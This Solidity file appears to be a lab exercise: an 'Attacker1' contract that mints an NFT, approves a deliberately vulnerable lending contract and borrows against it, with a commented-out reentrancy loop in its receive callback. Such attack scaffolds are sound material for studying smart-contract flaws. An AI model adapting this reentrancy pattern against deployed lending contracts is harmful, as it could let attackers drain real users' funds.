// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./VulnerableNFTLending.sol";
import "./NFT1.sol";
contract Attacker1 is IERC721Receiver {
    VulnerableNFTLending public lendingContract;
    NFT1 public nftContract;
    uint public reenterCount = 0;
    bool public attackInProgress = false;

    constructor(address payable _lendingContract, address nftContractAddress) {
        lendingContract = VulnerableNFTLending(_lendingContract);
        nftContract = NFT1(nftContractAddress);
    }

    function attack(uint _nftId, uint _loanAmount) external {
        attackInProgress = true;
        nftContract.mint(address(this), _nftId);
        nftContract.approve(address(lendingContract), _nftId);
        lendingContract.borrow(_nftId, _loanAmount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) public pure override returns (bytes4) {
        // if (attackInProgress && reenterCount < 5) {
        //     ++reenterCount;
        //     lendingContract.borrow(tokenId, 1 gwei);
        // }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
